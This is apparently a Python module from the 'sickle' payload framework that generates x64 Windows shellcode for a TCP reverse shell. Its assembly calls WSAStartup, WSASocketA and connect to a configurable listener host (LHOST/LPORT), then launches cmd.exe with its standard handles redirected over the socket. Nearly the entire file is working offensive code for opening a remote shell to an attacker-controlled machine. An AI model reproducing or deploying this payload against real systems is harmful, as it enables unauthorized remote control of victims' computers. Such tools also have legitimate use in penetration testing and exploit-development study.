import sys
import ctypes
import struct

from sickle.common.lib.generic import convert
from sickle.common.lib.generic import modparser
from sickle.common.lib.programmer import builder
from sickle.common.lib.programmer import stubhub

from sickle.common.lib.reversing.assembler import Assembler

from sickle.common.headers.windows import (
    ws2def,
    winsock2,
    processthreadsapi
)

class Shellcode():

    arch = "x64"

    platform = "windows"

    name = f"Windows ({arch}) CMD Reverse Shell"

    module = f"{platform}/{arch}/shell_reverse_tcp"

    example_run = f"{sys.argv[0]} -p {module} LHOST=192.168.81.144 LPORT=1337 -f c"

    ring = 3

    author = ["Morten Schenk",
              "Alexandru Uifalvi",
              "Matteo Memelli",
              "wetw0rk"]

    tested_platforms = ["Windows 10 (10.0.17763 N/A Build 17763)",
                        "Windows 11 (10.0.26100 N/A Build 26100)"]

    summary = ("Reverse Shell via TCP over IPv4 that provides an interactive cmd.exe "
               "session")

    description = ("A TCP-based reverse shell over IPv4 that provides an interactive cmd.exe"
    " session. Since this payload is not staged, there is no need for anything"
    " more than a Netcat listener.")

    arguments = {}
    arguments["LHOST"] = {}
    arguments["LHOST"]["optional"] = "no"
    arguments["LHOST"]["description"] = "Listener host to receive the callback"

    arguments["LPORT"] = {}
    arguments["LPORT"]["optional"] = "yes"
    arguments["LPORT"]["description"] = "Listening port on listener host"

    arguments["SHELL"] = {}
    arguments["SHELL"]["optional"] = "yes"
    arguments["SHELL"]["description"] = "Shell environment (powershell.exe, cmd.exe, etc)"

    advanced = {}
    advanced["EXITFUNC"] = {}
    advanced["EXITFUNC"]["optional"] = "yes"
    advanced["EXITFUNC"]["description"] = "Exit technique"
    advanced["EXITFUNC"]["options"] = { "terminate": "Terminates the process and all of its threads",
                                        "func": "Have the shellcode operate as function",
                                        "thread": "Exit as a thread",
                                        "process": "Exit as a process" }

    def __init__(self, arg_object):

        self.arg_list = arg_object["positional arguments"]

        self.dependencies = {
            "Kernel32.dll": [
                "LoadLibraryA",
                "CreateProcessA",
            ],
            "Ws2_32.dll": [
                "WSAStartup",
                "WSASocketA",
                "connect",
            ],
        }

        self.set_args()

        sc_args = builder.init_sc_args(self.dependencies)
        sc_args.update({
            "wsaData"              : 0x00,
            "name"                 : 0x00,
            "lpStartInfo"          : ctypes.sizeof(processthreadsapi._STARTUPINFOA),
            "lpCommandLine"        : self.shell_env_len,
            "lpProcessInformation" : 0x00,
        })

        self.stack_space = builder.calc_stack_space(sc_args)
        self.storage_offsets = builder.gen_offsets(sc_args)

        return

    def set_args(self):
        """Configure the arguments that may be used by the shellcode stub
        """

        all_args = Shellcode.arguments
        all_args.update(Shellcode.advanced)
        argv_dict = (modparser.argument_check(all_args, self.arg_list))
        if (argv_dict == None):
            exit(-1)

        # Set the shell environment that will be used by the shellcode. We must
        # ensure to NULL terminate it.
        if "SHELL" not in argv_dict.keys():
            self.shell = "cmd.exe"
        else:
            self.shell = argv_dict["SHELL"]

        self.shell += "\x00"
        while (len(self.shell) % 8) != 0:
            self.shell += "\x00"

        # Document the size of the shell environment
        self.shell_env_len = len(self.shell)

        # Configure the options used by the host to obtain the callback
        if "LPORT" not in argv_dict.keys():
            self.lport = 4242
        else:
            self.lport = int(argv_dict["LPORT"])

        self.lhost = argv_dict['LHOST']

        # Set the EXITFUNC and update the necessary dependencies
        self.exit_func = ""
        if "EXITFUNC" not in argv_dict.keys():
            self.exit_func = "terminate"
        else:
            self.exit_func = argv_dict["EXITFUNC"] 

        if self.exit_func == "terminate":
            self.dependencies["Kernel32.dll"] += "TerminateProcess",
        elif self.exit_func == "thread":
            self.dependencies["ntdll.dll"] = "RtlExitUserThread",
        elif self.exit_func == "process":
            self.dependencies["Kernel32.dll"] += "ExitProcess",

        return 0

    def gen_main(self):
        """Returns assembly source code for the main functionality of the stub
        """

        # Setup the members of the sockaddr structure 
        sin_port = struct.pack('<H', self.lport).hex()
        sin_family = struct.pack('>H', ws2def.AF_INET).hex()
        sin_addr = hex(convert.ip_str_to_inet_addr(self.lhost))

        src = f"""
; RAX => WSAStartup([in]  WORD      wVersionRequired, // RCX => MAKEWORD(2, 2) 
;                   [out] LPWSADATA lpWSAData);       // RDX => &wsaData
call_WSAStartup:
    mov rcx, 0x202
    lea rdx, [rbp - {self.storage_offsets['wsaData']}]
    mov rax, [rbp - {self.storage_offsets['WSAStartup']}]
    call rax

; RAX => WSASocketA([in] int                 af,              // RCX      => 0x02 (AF_INET)
;                   [in] int                 type,            // RDX      => 0x01 (SOCK_STREAM)
;                   [in] int                 protocol,        // R8       => 0x08 (IPPROTO_TCP)
;                   [in] LPWSAPROTOCOL_INFOA lpProtocolInfo,  // R9       => NULL
;                   [in] GROUP               g,               // RSP+0x20 => NULL
;                   [in] DWORD               dwFlags);        // RSP+0x28 => NULL
call_WSASocketA:
    mov ecx, {ws2def.AF_INET}
    mov edx, {winsock2.SOCK_STREAM}
    mov r8, {ws2def.IPPROTO_TCP}
    xor r9, r9
    mov [rsp+0x20], r9
    mov [rsp+0x28], r9
    mov rax, [rbp - {self.storage_offsets['WSASocketA']}]
    call rax

    mov rsi, rax // save the socket file descriptor (sockfd)

; RAX => connect([in] SOCKET s,             // RCX => sockfd (Obtained from WSASocketA)
;                [in] const sockaddr *name, // RDX => {{ IP | PORT | SIN_FAMILY }}
;                [in] int namelen);         // R8  => 0x10
call_connect:
    mov rcx, rax
    mov r8, {ctypes.sizeof(ws2def.sockaddr)}
    lea rdx, [rbp - {self.storage_offsets['name']}]
    mov r9, {sin_addr}{sin_port}{sin_family}
    mov [rdx], r9
    xor r9, r9
    mov [rdx + 0x8], r9
    mov rax, [rbp - {self.storage_offsets['connect']}]
    call rax

; [RBX] => typedef struct _STARTUPINFOA {{ }}
memset_STARTUPINFOA:
    lea rdi, [rbp - {self.storage_offsets['lpStartInfo']}]
    mov rbx, rdi
    xor eax, eax
    mov ecx, {int(ctypes.sizeof(processthreadsapi._STARTUPINFOA) / 0x04)}
    rep stosd

init_STARTUPINFOA:
    mov eax, {ctypes.sizeof(processthreadsapi._STARTUPINFOA)}
    mov [rbx], eax

    mov eax, {processthreadsapi.STARTF_USESTDHANDLES}
    mov [rbx + {processthreadsapi._STARTUPINFOA.dwFlags.offset}], eax
    mov [rbx + {processthreadsapi._STARTUPINFOA.hStdInput.offset}], rsi
    mov [rbx + {processthreadsapi._STARTUPINFOA.hStdOutput.offset}], rsi
    mov [rbx + {processthreadsapi._STARTUPINFOA.hStdError.offset}], rsi

; RAX => CreateProcessA([in, optional]      LPCSTR                lpApplicationName,     // RCX      => NULL
;                       [in, out, optional] LPSTR                 lpCommandLine,         // RDX      => "cmd"
;                       [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,   // R8       => NULL
;                       [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,    // R9       => NULL
;                       [in]                BOOL                  bInheritHandles,       // RSP+0x20 => NULL
;                       [in]                DWORD                 dwCreationFlags,       // RSP+0x28 => NULL
;                       [in, optional]      LPVOID                lpEnvironment,         // RSP+0x30 => NULL
;                       [in, optional]      LPCSTR                lpCurrentDirectory,    // RSP+0x38 => NULL
;                       [in]                LPSTARTUPINFOA        lpStartupInfo,         // RSP+0x40 => &lpStartupInfo
;                       [out]               LPPROCESS_INFORMATION lpProcessInformation); // RSP+0x48 => &lpStartupInfo
call_CreateProccessA:\n"""

        cmd_buffer = convert.from_str_to_xwords(self.shell)
        write_index = self.storage_offsets['lpCommandLine']

        for i in range(len(cmd_buffer["QWORD_LIST"])):
            src += "    mov rcx, 0x{}\n".format( struct.pack('<Q', cmd_buffer["QWORD_LIST"][i]).hex() )
            src += "    mov [rbp-{}], rcx\n".format(hex(write_index))
            write_index -= 8

        for i in range(len(cmd_buffer["DWORD_LIST"])):
            src += "    mov ecx, 0x{}\n".format( struct.pack('<L', cmd_buffer["DWORD_LIST"][i]).hex() )
            src += "    mov [rbp-{}], ecx\n".format(hex(write_index))
            write_index -= 4

        for i in range(len(cmd_buffer["WORD_LIST"])):
            src += "    mov cx, 0x{}\n".format( struct.pack('<H', cmd_buffer["WORD_LIST"][i]).hex() )
            src += "    mov [rbp-{}], cx\n".format(hex(write_index))
            write_index -= 2

        for i in range(len(cmd_buffer["BYTE_LIST"])):
            src += "    mov cl, {}\n".format( hex(cmd_buffer["BYTE_LIST"][i]) )
            src += "    mov [rbp-{}], cl\n".format(hex(write_index))
            write_index -= 1

        src += f"""    xor rcx, rcx
    mov [rbp - {write_index}], cl
    lea rdx, [rbp - {self.storage_offsets['lpCommandLine']}]\n"""

        src += f"""    xor r8, r8
    xor r9, r9
    xor eax, eax
    inc eax
    mov [rsp + 0x20], rax
    dec eax
    mov [rsp + 0x28], rax
    mov [rsp + 0x30], rax
    mov [rsp + 0x38], rax
    mov [rsp + 0x40], rbx
    lea rbx, [rbp - {self.storage_offsets['lpProcessInformation']}]
    mov [rsp + 0x48], rbx
    mov rax, [rbp - {self.storage_offsets['CreateProcessA']}]
    call rax\n"""

        return src

    def get_shellcode(self):
        """Generates Shellcode
        """

        generator = Assembler(Shellcode.arch)
        win_stubs = stubhub.WinRawr(self.storage_offsets,
                                    self.dependencies,
                                    self.stack_space,
                                    self.exit_func)

        main_src = self.gen_main()
        src = win_stubs.gen_source(main_src)
        shellcode = generator.get_bytes_from_asm(src)

        return shellcode
